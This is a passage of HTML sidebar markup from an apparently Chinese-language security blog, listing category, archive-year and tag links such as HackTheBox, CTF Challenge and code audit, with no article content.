    <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/category/Hackthebox/">Hackthebox</a></li><li class="category-list-item"><a class="category-list-link" href="/category/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/">安全运营</a></li><li class="category-list-item"><a class="category-list-link" href="/category/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">应用安全</a></li></ul>

            </section>
            <section class="aside-section">
                
    <h1>Archives</h1>

    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li></ul>


            </section>
            <section class="aside-section tag">
                
    <h1>Tags</h1>

    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" rel="tag">-安全运营 -安全建设</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-Challenge/" rel="tag">CTF Challenge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HackThebox/" rel="tag">HackThebox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">PHP代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SDL/" rel="tag">SDL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>

            </section>
        </aside>
    </div>
</body>

</html>